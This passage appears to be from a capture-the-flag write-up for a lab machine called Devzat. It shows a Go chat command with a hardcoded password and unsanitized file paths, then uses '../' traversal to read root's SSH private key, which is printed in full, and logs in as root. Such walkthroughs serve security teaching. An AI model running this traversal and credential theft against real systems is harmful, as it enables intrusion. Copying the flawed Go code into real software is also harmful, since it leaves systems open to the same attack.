-rw-------  1 catherine catherine 28297 Jul 16  2021 devzat-dev.zip
-rw-------  1 catherine catherine 27567 Jul 16  2021 devzat-main.zip
```

Download `devzat-main.zip` and `devzat-dev.zip` locally. `diff`ing the two directories shows a new `fileCommand` function in `dev`'s `commands.go`:

```go
func fileCommand(u *user, args []string) {
        if len(args) < 1 {
                u.system("Please provide file to print and the password")
                return
        }

        if len(args) < 2 {
                u.system("You need to provide the correct password to use this function")
                return
        }

        path := args[0]
        pass := args[1]

        // Check my secure password
        if pass != "CeilingCatStillAThingIn2021?" {
                u.system("You did provide the wrong password")
                return
        }

        // Get CWD
        cwd, err := os.Getwd()
        if err != nil {
                u.system(err.Error())
        }

        // Construct path to print
        printPath := filepath.Join(cwd, path)

        // Check if file exists
        if _, err := os.Stat(printPath); err == nil {
                // exists, print
                file, err := os.Open(printPath)
                if err != nil {
                        u.system(fmt.Sprintf("Something went wrong opening the file: %+v", err.Error()))
                        return
                }
                defer file.Close()

                scanner := bufio.NewScanner(file)
                for scanner.Scan() {
                        u.system(scanner.Text())
                }

                if err := scanner.Err(); err != nil {
                        u.system(fmt.Sprintf("Something went wrong printing the file: %+v", err.Error()))
                }

                return

        } else if os.IsNotExist(err) {
                // does not exist, print error
                u.system(fmt.Sprintf("The requested file @ %+v does not exist!", printPath))
                return
        }
        // bokred?
        u.system("Something went badly wrong.")
}
```

This creates a new `file` command in Devzat. It takes two parameters: a file path and a password, which must be `CeilingCatStillAThingIn2021?` to proceed.

It joins the program's current working directory with the input file path, ensures the resultant file exists, then outputs the contents of the file. The program doesn't seem to sanitize the input file path, making it possible to append arbitrary `../` sequences to the file path, traverse the file system, and read arbitrary files.

Initiate a local port forward from local port 8443 to the development Devzat instance running on the target's `localhost`:8443.

```bash
$ ssh -i patrick patrick@devzat.htb -L 8443:localhost:8443 -NT

```

Connect to the development Devzat instance and attempt to read `../etc/passwd`, being sure to enter the password from the source code, `CeilingCatStillAThingIn2021?`.

```bash
$ ssh catherine@localhost -p 8443
patrick: Hey Catherine, glad you came.
catherine: Hey bud, what are you up to?
patrick: Remember the cool new feature we talked about the other day?
catherine: Sure
patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.
catherine: Kinda busy right now 👔
patrick: That's perfectly fine 👍  You'll need a password which you can gather from the source. I left it in our default backups location.
catherine: k
patrick: I also put the main so you could diff main dev if you want.
catherine: Fine. As soon as the boss let me off the leash I will check it out.
patrick: Cool. I am very curious what you think of it. Consider it alpha state, though. Might not be secure yet. See ya!
devbot: patrick has left the chat
Welcome to the chat. There are no more users
devbot: catherine has joined the chat
catherine: /file ../etc/passwd CeilingCatStillAThingIn2021?
[SYSTEM] The requested file @ /root/etc/passwd does not exist!
```

The output indicates that one directory above the application's current working directory is `/root/`. Abuse this to read `root`'s SSH private key.

```bash
catherine: /file ../.ssh/id_rsa CeilingCatStillAThingIn2021?
[SYSTEM] -----BEGIN OPENSSH PRIVATE KEY-----
[SYSTEM] b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
[SYSTEM] QyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqAAAAJiUCzUclAs1
[SYSTEM] HAAAAAtzc2gtZWQyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqA
[SYSTEM] AAAECtFKzlEg5E6446RxdDKxslb4Cmd2fsqfPPOffYNOP20d+v8nnFgciadUghCpQomz7s
[SYSTEM] Q0ekw7ZzIOJu9Fn+tsKoAAAAD3Jvb3RAZGV2emF0Lmh0YgECAwQFBg==
[SYSTEM] -----END OPENSSH PRIVATE KEY-----
catherine:
```

Transfer the private key and clean it up.

```bash
$ cat root
[SYSTEM] -----BEGIN OPENSSH PRIVATE KEY-----
[SYSTEM] b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
[SYSTEM] QyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqAAAAJiUCzUclAs1
[SYSTEM] HAAAAAtzc2gtZWQyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqA
[SYSTEM] AAAECtFKzlEg5E6446RxdDKxslb4Cmd2fsqfPPOffYNOP20d+v8nnFgciadUghCpQomz7s
[SYSTEM] Q0ekw7ZzIOJu9Fn+tsKoAAAAD3Jvb3RAZGV2emF0Lmh0YgECAwQFBg==
[SYSTEM] -----END OPENSSH PRIVATE KEY-----
$ sed -i 's/\[SYSTEM\] //g' root
$ cat root
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqAAAAJiUCzUclAs1
HAAAAAtzc2gtZWQyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqA
AAAECtFKzlEg5E6446RxdDKxslb4Cmd2fsqfPPOffYNOP20d+v8nnFgciadUghCpQomz7s
Q0ekw7ZzIOJu9Fn+tsKoAAAAD3Jvb3RAZGV2emF0Lmh0YgECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
$ chmod 0600 root
```

Use the private key to access the target as `root` and read the system flag from `/root/root.txt`.

```bash
$ ssh -i root root@devzat.htb
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 14 Mar 2022 01:50:06 AM UTC

  System load:              0.0
  Usage of /:               56.7% of 7.81GB
  Memory usage:             28%
  Swap usage:               0%
  Processes:                238
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for eth0:    10.129.137.148
  IPv6 address for eth0:    dead:beef::250:56ff:feb9:e5d7


107 updates can be applied immediately.
33 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jan 26 16:26:44 2022
root@devzat:~# id
uid=0(root) gid=0(root) groups=0(root)
root@devzat:~# ls -la /root/root.txt
-r-------- 1 root root 33 Mar 13 23:01 /root/root.txt
```
